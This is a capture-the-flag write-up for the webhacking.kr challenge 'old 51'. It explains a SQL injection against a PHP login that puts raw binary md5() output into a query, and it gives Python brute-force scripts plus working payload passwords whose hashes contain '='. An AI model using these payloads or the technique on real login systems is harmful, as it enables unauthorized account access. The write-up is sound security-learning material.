# Old 51    SQLi (Binary MD5)

URL: [https://webhacking.kr/challenge/bonus-13/](https://webhacking.kr/challenge/bonus-13/)
[https://webhacking.kr/challenge/bonus-13/?view_source=1](https://webhacking.kr/challenge/bonus-13/?view_source=1)

![old-51.png](/assets/ctf/webhacking.kr/old-51.png)

```php
<?php
include "../../config.php";
if ($_GET["view_source"]) {
    view_source();
}
...
<?php if ($_POST["id"] && $_POST["pw"]) {
    $db = dbconnect();
    $input_id = addslashes($_POST["id"]);
    $input_pw = md5($_POST["pw"], true);
    $result = mysqli_fetch_array(
        mysqli_query(
            $db,
            "select id from chall51 where id='{$input_id}' and pw='{$input_pw}'"
        )
    );
    if ($result["id"]) {
        solve(51);
    }
    if (!$result["id"]) {
        echo "<center><font color=green><h1>Wrong</h1></font></center>";
    }
} ?>
...
```

The authentication code looks good, with 1 downside `md5(password, true)`

If we look into the php manual of [md5](https://www.php.net/manual/en/function.md5.php) function we see that second argument specifies `binary` mode.

![old-51-1.png](/assets/ctf/webhacking.kr/old-51-1.png)

```bash
└─$ php -a
Interactive shell

php > echo md5('test', true);
	k�!��N&'
```

As you can see binary format can have variety of characters and one of them may be quotes. 

[SQL injection with raw MD5 hashes (Leet More CTF 2010 injection 300)](https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)

The author of the post successfully managed to get in with this method 👀

![old-51-2.png](/assets/ctf/webhacking.kr/old-51-2.png)

The password is not protected with `addslashes` meaning if we can get `FALSE_VALUE'='FALSE_VALUE` which results in True we should be able to get in.

```python
from hashlib import md5

for i in range(int(1e10)):
    hash_ = md5(str(i).encode()).digest()
    if b"'='" in hash_:
        print('\r' + ' ' * 150, end='')    # ~Clear Progress Bar
        print(f'\r{i=}, {hash_=}')         # Target
        break
    else:
        print(f'\r{i=}, {hash_=}', end='') # ~Progress Bar
```

```bash
└─$ py old-51.py
i=1839431, hash_=b"\xc37\x90\xa5\xaf\xc4\xb1A@J\xbe'='\xaa\xa9"
```

Using `admin:1839431` we are able to login as admin (or any user).

---

Idk why, but I also decided to generate ascii one too.

```python
from hashlib import md5
from itertools import product
from string import ascii_letters

for i in product(ascii_letters, repeat=5):
    i = ''.join(i)
    hash_ = md5(i.encode()).digest()
    if b"'='" in hash_:
        print('\r' + ' ' * 256, end='')
        print(f'\r{i=}, {hash_=}')
        break
    else:
        print(f'\r{i=}, {hash_=}', end='')
```

```bash
└─$ py old-51.py
i='alDTC', hash_=b"9R\x82\xc8V\x92'='+\x9e\xd7\xd9\xe9\x00\x93"
```

